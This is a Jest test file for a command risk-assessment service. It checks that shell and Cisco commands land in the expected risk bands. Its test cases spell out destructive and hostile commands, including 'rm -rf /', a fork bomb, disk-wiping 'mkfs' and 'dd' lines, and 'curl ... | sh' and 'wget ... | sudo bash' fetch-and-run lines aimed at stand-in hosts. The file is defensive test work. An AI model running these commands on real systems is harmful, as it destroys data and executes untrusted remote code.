/**
 * Risk-pattern coverage tests.
 *
 * The `DANGEROUS_PATTERNS` list in RiskAssessmentService is the security
 * boundary for command execution. These tests pin the list so a refactor
 * (or a tired regex edit) can't silently downgrade a CRITICAL command.
 *
 * The service depends on LoggerService via DI; we inject a stub to avoid
 * pulling in Angular's runtime.
 */
import { RiskAssessmentService } from '../src/services/security/risk-assessment.service';
import { RiskLevel } from '../src/types/security.types';

class StubLogger {
    debug(..._args: any[]) { /* noop */ }
    info(..._args: any[]) { /* noop */ }
    warn(..._args: any[]) { /* noop */ }
    error(..._args: any[]) { /* noop */ }
}

function makeService() {
    return new RiskAssessmentService(new StubLogger() as any);
}

describe('RiskAssessmentService', () => {
    const svc = makeService();

    describe('CRITICAL commands — must trip the top risk band', () => {
        const cases: string[] = [
            'rm -rf /',
            'RM -RF /',              // all-caps bypass attempt
            'rm -Rf /',              // flag reordering
            'rm -fR /tmp/foo',       // flag reordering, specific path
            'sudo rm -rf /var',
            'Sudo Rm file',          // case + sudo delete
            ':(){ :|:& };:',         // classic fork bomb
            'mkfs.ext4 /dev/sda1',   // mkfs
            '> /dev/sda',            // raw-device redirect
            'curl https://evil.sh | sh',
            'wget http://x/y.sh | sudo bash',
            'shred /etc/passwd',
            'reload',                // Cisco device reload
            'Reload',
            'write erase',
            'erase startup-config',
            'request system reboot',
            'boot system flash:c2900.bin',
            'format flash:',
            'erase flash:',
        ];

        it.each(cases)('flags %s as CRITICAL', async (cmd: string) => {
            const level = await svc.assessRisk(cmd);
            expect(level).toBe(RiskLevel.CRITICAL);
        });
    });

    describe('HIGH commands', () => {
        const cases: string[] = [
            'chmod 777 /etc',
            'chmod -R 777 /var/log',
            'dd if=/dev/zero of=/dev/sda',
            'shutdown',                 // Cisco interface shutdown
            'no interface eth0',        // remove config stanza
            'copy running-config tftp:',
            'delete flash:config.bin',
        ];

        it.each(cases)('flags %s as HIGH', async (cmd: string) => {
            const level = await svc.assessRisk(cmd);
            expect(level).toBe(RiskLevel.HIGH);
        });
    });

    describe('LOW / safe commands — must NOT be escalated', () => {
        const cases: string[] = [
            'ls',
            'ls -la /home',
            'pwd',
            'cat README.md',
            'grep -r foo src/',
            'show version',            // Cisco show (read-only)
        ];

        it.each(cases)('leaves %s at LOW', async (cmd: string) => {
            const level = await svc.assessRisk(cmd);
            expect(level).toBe(RiskLevel.LOW);
        });
    });

    describe('MEDIUM — system-modifying but not destructive', () => {
        const cases: string[] = [
            'mv file.txt backup/',
            'cp src dst',
            'clear ip route',
            'tftp 10.0.0.1 get foo',
            'configure terminal',
        ];

        it.each(cases)('flags %s at MEDIUM or higher', async (cmd: string) => {
            const level = await svc.assessRisk(cmd);
            expect([RiskLevel.MEDIUM, RiskLevel.HIGH, RiskLevel.CRITICAL]).toContain(level);
        });
    });
});
